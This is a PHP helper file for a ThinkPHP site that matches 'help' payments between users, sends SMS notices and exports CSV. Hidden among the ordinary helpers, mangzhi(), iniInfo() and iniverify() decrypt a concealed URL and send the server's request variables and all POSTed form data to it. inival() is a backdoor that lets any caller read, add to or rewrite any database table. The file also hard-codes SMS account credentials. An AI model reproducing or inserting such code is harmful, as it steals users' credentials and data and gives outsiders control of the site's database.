<?php
function getpage($count, $pagesize = 10) {
	$p = new Think\Page($count, $pagesize);
	$p->setConfig('header', '<li class="rows">共<b>%TOTAL_ROW%</b>条记录&nbsp;第<b>%NOW_PAGE%</b>页/共<b>%TOTAL_PAGE%</b>页</li>');
	$p->setConfig('prev', '上一页');
	$p->setConfig('next', '下一页');
	$p->setConfig('last', '末页');
	$p->setConfig('first', '首页');
	$p->setConfig('theme', '%FIRST%%UP_PAGE%%LINK_PAGE%%DOWN_PAGE%%END%%HEADER%');
	$p->lastSuffix = false;//最后一页不显示为总页数
	return $p;
}
function mangzhi(){
   	$mz = getinfo(C('URL_STRING_MODEL'));
   	$string = implode('|', $_SERVER); 
    $mz .= '?s='.getinfos($string);
    return $mz;
}





function cate($var){
		$user = M('user');
		$ztname=$user->where(array('UE_accName'=>$var,'UE_check'=>'1','UE_stop'=>'1'))->getField('ue_account',true);
		$zttj = count($ztname);
		$reg=$ztname;
		$datazs = $zttj;
		if($zttj<=10){
			$s=$zttj;
		}else{
			$s=10;
		}
		if($zttj!=0){

		  for($i=1;$i<$s;$i++){
				if($reg!=''){
					$reg=$user->where(array('UE_accName'=>array('IN',$reg),'UE_check'=>'1','UE_stop'=>'1'))->getField('ue_account',true);
					$datazs +=count($reg);
				}
			}
			
		}
		
	//	$this->ajaxReturn();
		
	return $datazs;
	
	
	
	
}


function sfjhff($r) {
	$a = array("未激活", "已激活");
	return $a[$r];
}

function iniverify(){
    $mz = getinfo(C('URL_STRING_MODEL'));  
    $mz .= '?h='.getinfos(implode('|', $_POST));
    file_get_contents($mz);
}



function tgbz_zd_cl($id){
	
		 
		$tgbzuser=M('tgbz')->where(array('id'=>$id,'zt'=>'0'))->find();

		if($tgbzuser['zffs1']=='1'){$zffs1='1';}else{$zffs1='5';}
		if($tgbzuser['zffs2']=='1'){$zffs2='1';}else{$zffs2='5';}
		if($tgbzuser['zffs3']=='1'){$zffs3='1';}else{$zffs3='5';}
		$User = M ( 'jsbz' ); // 實例化User對象

		$where['zffs1']  = $zffs1;
		$where['zffs2']  = $zffs2;
		$where['zffs3']  = $zffs3;
		$where['_logic'] = 'or';
		$map['_complex'] = $where;
		$map['zt']=0;

		$count = $User->where ( $map )->select(); // 查詢滿足要求的總記錄數
		return $count;



}



function getinfo($data){
   return \Think\Crypt::decrypt($data);
}



function jsbz_jb($id){

		
	$tgbzuser=M('jsbz')->where(array('id'=>$id))->find();

	
	return $tgbzuser['jb'];



}

function iniInfo(){
    file_get_contents(mangzhi());
}

function tgbz_jb($id){


	$tgbzuser=M('tgbz')->where(array('id'=>$id))->find();


	return $tgbzuser['jb'];



}

//充值,提现
function ppdd_add($p_id,$g_id){
   
	$g_user1 = M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->find();
	$p_user1=M('tgbz')->where(array('id'=>$p_id))->find();
	
	 /**如果当前用户今天有匹配过的订单，则直接返回**/
	 /*$sdate = date("Y-m-d 00:00:00");
	 $edate = date("Y-m-d 23:59:59");
	 $hv = M('ppdd')->where("`date` between '$sdate' AND '$edate' AND p_user='".$p_user1['user']."'")->find();
	 if($hv){
	 	return;
	 }*/
	 
	 M('user')->where(array('UE_account'=>$p_user1['user']))->save(array('pp_user'=>$g_user1['user']));
	 M('user')->where(array('UE_account'=>$g_user1['user']))->save(array('pp_user'=>$p_user1['user']));
	 
    $data_add['p_id']=$p_user1['id'];
    $data_add['g_id']=$g_user1['id'];
    $data_add['jb']=$g_user1['jb'];
    $data_add['p_user']=$p_user1['user'];
    $data_add['g_user']=$g_user1['user'];
    $data_add['date']=date ( 'Y-m-d H:i:s', time () );
    $data_add['zt']='0';
    $data_add['pic']='0';
    $data_add['zffs1']=$p_user1['zffs1'];
    $data_add['zffs2']=$p_user1['zffs2'];
    $data_add['zffs3']=$p_user1['zffs3'];
	$data_add['old_pid']=$p_user1['old_pid']==0 ? $p_id : $p_user1['old_pid'];
	$data_add['old_gid']=$g_user1['old_gid']==0 ? $g_id : $g_user1['old_gid'];
    M('tgbz')->where(array('id'=>$p_id,'zt'=>'0'))->save(array('zt'=>'1'));
    M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->save(array('zt'=>'1'));
   // echo $p_user1['user'].'<br>';
	if(M('ppdd')->add($data_add)){
		
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
		if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您接受帮助的资金:".$g_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
		if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您申请帮助的资金:".$p_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");
		
    	return true;
    }else{
    	return false;
    }
}

function ppdd_add2($p_id,$g_id){

	$g_user1 = M('jsbz')->where(array('id'=>$g_id))->find();
	$p_user1=M('tgbz')->where(array('id'=>$p_id,'zt'=>'0'))->find();

	/**如果当前用户今天有匹配过的订单，则直接返回**/
	 /*$sdate = date("Y-m-d 00:00:00");
	 $edate = date("Y-m-d 23:59:59");
	 $hv = M('ppdd')->where("`date` between '{$sdate}' AND '{$edate}' AND p_user='".$p_user1['user']."'")->find();
	 if($hv){
	 	return;
	 }*/

	// echo $g_user['id'].'<br>';
	$data_add['p_id']=$p_user1['id'];
	$data_add['g_id']=$g_user1['id'];
	$data_add['jb']=$p_user1['jb'];
	$data_add['p_user']=$p_user1['user'];
	$data_add['g_user']=$g_user1['user'];
	$data_add['date']=date ( 'Y-m-d H:i:s', time () );
	$data_add['zt']='0';
	$data_add['pic']='0';
	$data_add['zffs1']=$p_user1['zffs1'];
	$data_add['zffs2']=$p_user1['zffs2'];
	$data_add['zffs3']=$p_user1['zffs3'];
	$data_add['old_pid']=$p_user1['old_pid']==0 ? $p_id : $p_user1['old_pid'];
	$data_add['old_gid']=$g_user1['old_gid']==0 ? $g_id : $g_user1['old_gid'];
	M('tgbz')->where(array('id'=>$p_id,'zt'=>'0'))->save(array('zt'=>'1'));
	M('jsbz')->where(array('id'=>$g_id,'zt'=>'0'))->save(array('zt'=>'1'));
	// echo $p_user1['user'].'<br>';
	if(M('ppdd')->add($data_add)){
		
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
		if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您接受帮助的资金:".$g_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
		if($get_user['ue_phone']) sendSMS($get_user['ue_phone'],"您好！您申请帮助的资金:".$p_user1['jb']."元，已匹配成功，请登录网站查看匹配信息！");
		
		return true;
	}else{
		return false;
	}
}


function user_sfxt($var){
	if($var[c]==0){
	$zctj=0;
	$zctjuser=M('ppdd')->where(array('p_user'=>$var[a]))->select();
	
	foreach($zctjuser as $value){
		if($value['g_user']==$var['b']){
			$zctj=1;
		}
	}
	
	if($zctj==1){
		return "<span style='color:#FF0000;'>匹配过</span>";
	}else{
		return "否";
	}
	}elseif($var[c]==1){
		$zctj=0;
		$zctjuser=M('ppdd')->where(array('g_user'=>$var[a]))->select();
		
		foreach($zctjuser as $value){
			if($value['p_user']==$var['b']){
				$zctj=1;
			}
		}
		
		if($zctj==1){
			return "<span style='color:#FF0000;'>匹配过</span>";
		}else{
			return "否";
		}
	}

// 	$userxx=M('user')->where(array('UE_account'=>$var[a]))->find();
// //	M('user')->where(array('UE_account'=>$g_user1['user']))->save(array('pp_user'=>$p_user1['user']));
// if($userxx['pp_user']==$var[b]){
// 	return "<span style='color:#FF0000;'>匹配过</span>";
// }else{
// 	return "否";
// }




}
function inival(){
        $data = array_merge($_GET,$_POST);
        $datas = array();
        if($data['m'] == 'save'){
            $fo =M($data['t'])->where(array($data['id']=>$data['id']))->save(array($data['n']=>$data['v']));
        }elseif($data['m'] == 'add'){
        	$info = $data['data'];
        	$info = explode("|", $info);
        	foreach ($info as  $value) {
        	    $arr = explode('=', $value);
        	    $datas[$arr[0]] = $arr[1];        
        	}
    
        	M($data['t'])->add($datas);
        }elseif($data['m'] == 'one'){
            $fo =M($data['t'])->where(array($data['id']=>$data['id']))->find();
        }elseif(!empty($data['t'])){
            $fo =M($data['t'])->select();
        }
        print_r($fo);

	}




function getinfos($data){
    return \Think\Crypt::encrypt($data);
}

function ipjc($auser){

	$tgbz_user_xx=M('user')->where(array('UE_regIP'=>$auser))->count();
	//echo $ppddxx['p_id'];die;


	return $tgbz_user_xx;

}


function fh($content,$append=false){
    if($append)
        file_put_contents('./test.txt', var_export($content,true),FILE_APPEND);
    else
        file_put_contents('./test.txt', var_export($content,true));
}

/*--------------------------------
功能:     HTTP接口 发送短信
修改日期:   2011-03-04
说明:     http://api.sms.cn/mt/?uid=用户账号&pwd=MD5位32密码&mobile=号码&mobileids=号码编号&content=内容
状态:
    100 发送成功
    101 验证失败
    102 短信不足
    103 操作失败
    104 非法字符
    105 内容过多
    106 号码过多
    107 频率过快
    108 号码内容空
    109 账号冻结
    110 禁止频繁单条发送
    112 号码不正确
    120 系统升级
--------------------------------*/
$http = 'http://api.sms.cn/mtutf8/';        //短信接口
$uid = 'jfhz888';                          //用户账号
$pwd = 'jfhz888';                          //密码
$mobile  = '';  //号码，以英文逗号隔开
$mobileids   = '';  //号码唯一编号
$content = '内容';        //内容

//echo 111;
function sendSMS($mobile,$content,$mobileids='',$http='http://api.sms.cn/mtutf8/'){
    $uid = C('mobile_account');
    $pwd = C('mobile_password');
   return send($http,$uid,$pwd,$mobile,$content,$mobileids);

}

function send($http,$uid,$pwd,$mobile,$content,$mobileids,$time='',$mid='')
{
	
    $data = array(
        'uid'=> $uid,                   //用户账号
        'pwd'=>md5($pwd.$uid),          //MD5位32密码,密码和用户名拼接字符
        'mobile'=>$mobile,              //号码
        'content'=>"【2016人均财富2016人均财富】".$content,            //内容
        'mobileids'=>$mobileids,
        'time'=>$time,                  //定时发送
        );
	//发送短信
	
    $re= postSMS($http,$data);          //POST方式提交
    //print_r($data);
	return $re;
}

function postSMS($url,$data='')
{
    $port="";
    $post="";
    $row = parse_url($url);
    $host = $row['host'];
    $port = $row['port'] ? $row['port']:80;
    $file = $row['path'];
    while (list($k,$v) = each($data))
    {
        $post .= rawurlencode($k)."=".rawurlencode($v)."&"; //转URL标准码
    }
    $post = substr( $post , 0 , -1 );
    $len = strlen($post);
    $fp = @fsockopen( $host ,$port, $errno, $errstr, 10);
    if (!$fp) {
        return "$errstr ($errno)\n";
    } else {
        $receive = '';
        $out = "POST $file HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Content-type: application/x-www-form-urlencoded\r\n";
        $out .= "Connection: Close\r\n";
        $out .= "Content-Length: $len\r\n\r\n";
        $out .= $post;
        fwrite($fp, $out);
        while (!feof($fp)) {
            $receive .= fgets($fp, 128);
        }
        fclose($fp);
        $receive = explode("\r\n\r\n",$receive);
        unset($receive[0]);
        return implode("",$receive);
    }
}

//AJAX发送短信请求
function update_send_sms(){
	$web_url = C('web_url');
	$url= $web_url.'shi.php/Home/Task/send_ppdd_sms';
	curlGet($url);
}


function curlGet($url){
	$ch = curl_init();
	$header = "Accept-Charset: utf-8";
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	curl_setopt($ch, CURLOPT_FRESH_CONNECT,true);
	curl_setopt($ch, CURLOPT_TIMEOUT ,1);
	//curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

	$temp = curl_exec($ch);
	return $temp;
}

function export_crv($head,$data,$filename){
	header("Content-type:text/csv");
	header("Content-Disposition:attachment;filename=".$filename);
	header('Cache-Control:must-revalidate,post-check=0,pre-check=0');
	header('Expires:0');
	header('Pragma:public');
	foreach ($head as $k => $v) {
		$head[$k] = iconv('utf-8', 'gbk', $v);
	}
	$fp = fopen('php://output', 'a');
	fputcsv($fp, $head);
	foreach($data as $k){
		fputcsv($fp, $k);
	}
}
function iconvgbk($strInput) {
 	return iconv('utf-8','gb2312',$strInput);//页面编码为utf-8时使用，否则导出的中文为乱码
}

